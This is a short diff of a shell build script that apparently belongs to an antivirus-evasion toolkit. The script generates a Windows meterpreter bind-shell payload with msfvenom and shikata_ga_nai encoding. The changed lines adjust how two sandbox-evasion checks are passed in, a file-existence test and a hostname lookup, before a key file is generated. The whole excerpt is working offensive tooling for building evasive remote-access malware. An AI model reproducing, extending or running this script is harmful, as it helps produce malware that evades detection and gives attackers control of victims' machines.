@@ -22,9 +22,8 @@ msfvenom -p windows/meterpreter/bind_tcp lport=$LPORT -e x86/shikata_ga_nai -i 2
 . build/feature_construction.sh
 
 # add evasion techniques
-add_evasion fopen_sandbox_evasion
-printf "\n#define HOSTVALUE \"this.that\"" >> source/evasion/evasion.include
-add_evasion gethostbyname_sandbox_evasion
+add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
+add_evasion gethostbyname_sandbox_evasion 'this.that'
 
 # generate key file
 generate_key preset aabbcc12de input/key_raw.txt
